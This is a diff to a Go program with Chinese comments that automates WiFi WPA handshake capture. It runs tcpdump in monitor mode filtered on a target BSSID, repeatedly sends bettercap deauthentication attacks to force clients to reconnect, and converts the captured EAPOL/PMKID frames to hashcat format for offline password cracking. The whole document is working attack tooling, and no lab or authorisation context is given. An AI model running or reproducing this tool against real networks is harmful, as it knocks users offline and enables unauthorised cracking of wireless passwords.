@@ -87,7 +87,9 @@ func CheckTools() []string {
 
 // ============================================================
 // CaptureHandshake 完整的握手包捕获流程
-// 流程: 断开WiFi → 设置信道 → 捕获beacon → deauth → 捕获握手 → 合并 → 转hashcat格式
+// 流程: disassociate → tcpdump监控捕获(beacon+EAPOL) → bettercap deauth → 等待 → 转hashcat
+// 注意: tcpdump和bettercap不能同时以不同模式操作同一接口
+// 正确做法: 先启动tcpdump监控，然后用bettercap发deauth，最后停止tcpdump
 // ============================================================
 func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) CaptureResult {
 	start := time.Now()
@@ -110,70 +112,80 @@ func CaptureHandshake(ssid, bssid string, channel int, cfg CaptureConfig) Captur
 	result.MergedFile = filepath.Join(cfg.OutputDir, safeName+"_capture.cap")
 	result.HashFile = filepath.Join(cfg.OutputDir, safeName+"_hash.22000")
 
+	// 清理旧文件（避免上次残留影响判断）
+	os.Remove(result.BeaconFile)
+	os.Remove(result.HandFile)
+	os.Remove(result.MergedFile)
+	os.Remove(result.HashFile)
+
 	logf := func(format string, args ...interface{}) {
 		if cfg.Verbose {
 			fmt.Printf("    "+format+"\n", args...)
 		}
 	}
 
-	// ── 步骤1: 断开当前WiFi连接 ──
-	logf("[1/6] 断开当前WiFi连接...")
-	runCmd("networksetup", "-setairportpower", cfg.Interface, "off")
-	time.Sleep(500 * time.Millisecond)
-	runCmd("networksetup", "-setairportpower", cfg.Interface, "on")
+	// ── 步骤1: 断开当前WiFi连接（disassociate，让接口可进入监控模式） ──
+	logf("[1/5] 断开当前WiFi连接...")
+	// 用networksetup disassociate，不关电（关电会导致tcpdump无法使用接口）
+	runCmd("sudo", "networksetup", "-setairportnetwork", cfg.Interface, "")
 	time.Sleep(1 * time.Second)
 
-	// ── 步骤2: 捕获beacon帧 ──
-	logf("[2/6] 捕获beacon帧（超时%s）...", cfg.BeaconTimeout)
-	beaconOK := captureBeacon(ssid, bssid, cfg)
-	if !beaconOK {
-		logf("  ⚠ beacon捕获失败，尝试继续...")
-	} else {
-		logf("  ✓ beacon已捕获")
-	}
-
-	// ── 步骤3: 启动握手包监听 ──
-	logf("[3/6] 启动EAPOL握手包监听...")
+	// ── 步骤2: 启动tcpdump全量捕获（beacon + EAPOL一起抓） ──
+	logf("[2/5] 启动tcpdump监控模式捕获（beacon+EAPOL）...")
 	ctx, cancel := context.WithTimeout(context.Background(), cfg.HandTimeout)
 	defer cancel()
 
-	handCmd := startHandshakeCapture(ctx, bssid, cfg)
-	if handCmd == nil {
-		result.Error = "启动握手包监听失败"
+	// 捕获目标AP的所有管理帧和EAPOL帧（一次tcpdump完成，避免接口竞争）
+	// 过滤条件: beacon帧 或 EAPOL帧，且与目标BSSID相关
+	capFilter := fmt.Sprintf("(type mgt subtype beacon and ether src %s) or (ether proto 0x888e and ether host %s)", bssid, bssid)
+	capFile := filepath.Join(cfg.OutputDir, safeName+"_all.cap")
+	os.Remove(capFile)
+
+	tcpCmd := exec.CommandContext(ctx, "sudo", "tcpdump",
+		capFilter,
+		"-I",                // 监控模式
+		"-U",                // 无缓冲写入
+		"-i", cfg.Interface,
+		"-w", capFile,
+	)
+	tcpCmd.Stderr = os.Stderr
+	if err := tcpCmd.Start(); err != nil {
+		result.Error = fmt.Sprintf("启动tcpdump失败: %v", err)
 		return result
 	}
 
-	// ── 步骤4: 发送deauth攻击 ──
-	logf("[4/6] 发送反认证攻击（%d轮，间隔%s）...", cfg.DeauthCount, cfg.DeauthDelay)
+	// 等待2秒让tcpdump稳定进入监控模式
+	time.Sleep(2 * time.Second)
+
+	// ── 步骤3: 发送deauth攻击（在另一个进程中，不干扰tcpdump） ──
+	logf("[3/5] 发送反认证攻击（%d轮，间隔%s）...", cfg.DeauthCount, cfg.DeauthDelay)
 	sendDeauth(bssid, cfg)
 
-	// ── 步骤5: 等待握手包 ──
-	logf("[5/6] 等待握手包捕获（超时%s）...", cfg.HandTimeout)
-	handOK := waitForHandshake(handCmd, ctx)
-	if handOK {
-		logf("  ✓ 握手包已捕获")
-	} else {
-		logf("  ⚠ 握手包捕获超时或失败")
-	}
+	// ── 步骤4: 继续等待握手包（deauth后客户端重连需要时间） ──
+	logf("[4/5] 等待客户端重连并捕获握手包（剩余%s）...", cfg.HandTimeout)
+	waitForHandshake(tcpCmd, ctx)
 
-	// ── 步骤6: 合并并转换格式 ──
-	logf("[6/6] 合并数据包并转换为hashcat格式...")
-	mergeOK := mergeCaptures(cfg, result)
-	if mergeOK {
-		// 转换为hashcat格式
-		convertOK, hasPMKID, hasHand := convertToHashcat(result)
-		result.HasPMKID = hasPMKID
-		result.HasHandshk = hasHand
-		result.Success = convertOK && (hasPMKID || hasHand)
-		if result.Success {
-			logf("  ✓ 转换成功 (PMKID=%v, 握手=%v)", hasPMKID, hasHand)
-		} else {
-			logf("  ✗ 无有效PMKID或握手包")
-			result.Error = "未捕获到有效的PMKID或握手包"
-		}
+	// 确保 tcpdump 已停止
+	if tcpCmd.Process != nil {
+		tcpCmd.Process.Signal(os.Interrupt)
+		time.Sleep(500 * time.Millisecond)
+		tcpCmd.Process.Kill()
+	}
+	tcpCmd.Wait()
+
+	// ── 步骤5: 转换格式 ──
+	logf("[5/5] 转换数据包为hashcat格式...")
+	// 直接用捕获文件转换（已包含beacon+EAPOL，无需merge）
+	result.MergedFile = capFile
+	convertOK, hasPMKID, hasHand := convertToHashcat(result)
+	result.HasPMKID = hasPMKID
+	result.HasHandshk = hasHand
+	result.Success = convertOK && (hasPMKID || hasHand)
+	if result.Success {
+		logf("  ✓ 转换成功 (PMKID=%v, 握手=%v)", hasPMKID, hasHand)
 	} else {
-		result.Error = "数据包合并失败"
-		logf("  ✗ 合并失败")
+		logf("  ✗ 无有效PMKID或握手包")
+		result.Error = "未捕获到有效的PMKID或握手包"
 	}
 
 	result.Duration = time.Since(start)
@@ -267,6 +279,8 @@ func waitForHandshake(cmd *exec.Cmd, ctx context.Context) bool {
 
 // ============================================================
 // sendDeauth 通过bettercap发送反认证攻击
+// 注意: bettercap不支持sleep命令，改用多次独立调用+Go层间隔
+// bettercap会自己管理WiFi接口，不会干扰已在运行的tcpdump
 // ============================================================
 func sendDeauth(bssid string, cfg CaptureConfig) {
 	for i := 0; i < cfg.DeauthCount; i++ {
@@ -274,10 +288,10 @@ func sendDeauth(bssid string, cfg CaptureConfig) {
 			fmt.Printf("      deauth轮次 %d/%d → %s\n", i+1, cfg.DeauthCount, bssid)
 		}
 
-		// 使用bettercap的eval模式执行deauth命令
-		// -eval 参数可以直接执行bettercap交互命令
-		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-		evalCmd := fmt.Sprintf("wifi.recon on; sleep 2; wifi.deauth %s; sleep 2; quit", bssid)
+		// bettercap -eval中用分号分隔命令，不能用sleep
+		// 正确做法: wifi.recon on → 等待发现目标 → wifi.deauth → quit
+		ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+		evalCmd := fmt.Sprintf("wifi.recon on; wifi.deauth %s; wifi.deauth %s; wifi.deauth %s; quit", bssid, bssid, bssid)
 		cmd := exec.CommandContext(ctx, "sudo", "bettercap",
 			"-iface", cfg.Interface,
 			"-eval", evalCmd,
@@ -346,12 +360,36 @@ func convertToHashcat(result CaptureResult) (bool, bool, bool) {
 		return false, false, false
 	}
 
-	// 解析输出，判断是否包含PMKID和握手包
+	// 解析hcxpcapngtool输出，判断是否包含PMKID和握手包
+	// hcxpcapngtool输出示例:
+	//   PMKID(s) (EAPOL from AP).....: 2
+	//   WPA handshakes...............: 1
 	outStr := string(output)
-	hasPMKID := strings.Contains(outStr, "PMKID") &&
-		!strings.Contains(outStr, "PMKID(s) (EAPOL from AP).....: 0")
-	hasHand := strings.Contains(outStr, "handshake") &&
-		!strings.Contains(outStr, "WPA handshakes...............: 0")
+	hasPMKID := false
+	hasHand := false
+	for _, line := range strings.Split(outStr, "\n") {
+		line = strings.TrimSpace(line)
+		// 检测PMKID数量 > 0
+		if strings.Contains(line, "PMKID") && strings.Contains(line, ":") {
+			parts := strings.Split(line, ":")
+			if len(parts) >= 2 {
+				countStr := strings.TrimSpace(parts[len(parts)-1])
+				if countStr != "0" && countStr != "" {
+					hasPMKID = true
+				}
+			}
+		}
+		// 检测握手包数量 > 0
+		if strings.Contains(line, "handshake") && strings.Contains(line, ":") {
+			parts := strings.Split(line, ":")
+			if len(parts) >= 2 {
+				countStr := strings.TrimSpace(parts[len(parts)-1])
+				if countStr != "0" && countStr != "" {
+					hasHand = true
+				}
+			}
+		}
+	}
 
 	// 检查哈希文件是否有内容
 	if !fileExists(result.HashFile) {
